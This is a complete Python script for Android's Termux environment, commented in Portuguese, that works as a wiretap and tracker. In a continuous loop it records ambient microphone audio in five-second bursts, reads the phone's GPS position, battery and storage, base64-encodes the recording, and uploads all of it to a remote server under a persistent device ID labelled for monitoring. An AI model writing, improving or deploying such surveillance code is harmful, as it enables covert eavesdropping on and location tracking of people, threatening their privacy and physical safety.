import time
import subprocess
import json
import requests
import os
import base64

URL_SERVIDOR = "https://nexos-t0to.onrender.com/update"
ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
ARQUIVO_AUDIO = os.path.expanduser("~/grampo.mp3")

def run_command(cmd):
    try: return subprocess.check_output(cmd, shell=True).decode().strip()
    except: return ""

def obter_ou_criar_id_unico():
    if os.path.exists(ARQUIVO_ID):
        with open(ARQUIVO_ID, "r") as f: return f.read().strip()
    novo_id = f"NX-{str(os.getpid())[:4].upper()}"
    with open(ARQUIVO_ID, "w") as f: f.write(novo_id)
    return novo_id

DEVICE_ID = obter_ou_criar_id_unico()

print("\n" + "="*45)
print(f"🤖 SISTEMA NEXOS CORE COM ESCUTA ATIVADO!")
print(f"🔑 ID PARA MONITORAR: {DEVICE_ID}")
print("="*45 + "\n")

def coletar_e_enviar():
    # 1. Força a parada de qualquer gravação antiga perdida por segurança
    run_command("termux-microphone-record -q")
    os.system(f"rm -f {ARQUIVO_AUDIO}")

    # 2. Liga o Microfone (o Android vai abrir o loop de tempo doido dele)
    print("🎙️ Gravando ambiente (5 segundos)...")
    subprocess.Popen(f"termux-microphone-record -f {ARQUIVO_AUDIO}", shell=True)
    
    # 3. CRONÔMETRO DO PYTHON: O Script espera 5 segundos certinhos enquanto você fala
    time.sleep(5)
    
    # 4. CORTA NA MARRA: Manda o comando fechar o microfone no soco
    run_command("termux-microphone-record -q")

    # Transforma o arquivo mp3 gerado em texto Base64 para poder enviar via HTTP
    audio_b64 = ""
    if os.path.exists(ARQUIVO_AUDIO) and os.path.getsize(ARQUIVO_AUDIO) > 100:
        with open(ARQUIVO_AUDIO, "rb") as audio_file:
            audio_b64 = base64.b64encode(audio_file.read()).decode('utf-8')

    # Coleta de sistema normais
    battery = "N/A"
    out_bat = run_command("termux-battery-status")
    if out_bat:
        try: battery = str(json.loads(out_bat).get("percentage", "N/A"))
        except: pass
        
    storage = "N/A"
    out_df = run_command("df -h /data/data/com.termux/files/home")
    if out_df:
        try:
            lines = out_df.split("\n")
            if len(lines) > 1:
                parts = [p for p in lines[1].split(" ") if p]
                if len(parts) >= 3: storage = f"{parts[3]} livres"
        except: pass

    # Coleta de GPS ativa
    lat, lon = -16.6869, -49.2648
    out_loc = run_command("termux-location -p gps -r once")
    if out_loc:
        try:
            loc_data = json.loads(out_loc)
            lat = loc_data.get("latitude", lat)
            lon = loc_data.get("longitude", lon)
        except: pass

    payload = {
        "device_id": DEVICE_ID,
        "battery": battery,
        "storage": storage,
        "uptime": "Ativo",
        "lat": lat,
        "lon": lon,
        "audio_b64": audio_b64
    }

    try:
        response = requests.post(URL_SERVIDOR, json=payload, timeout=12)
        if response.status_code == 200: 
            print(f"📡 Dados e Áudio transmitidos! GPS: {lat}, {lon}")
    except Exception as e:
        print(f"❌ Erro de envio: {e}")

while True:
    coletar_e_enviar()
    time.sleep(5) # Espera 5 segundos e abre o próximo ciclo de gravação
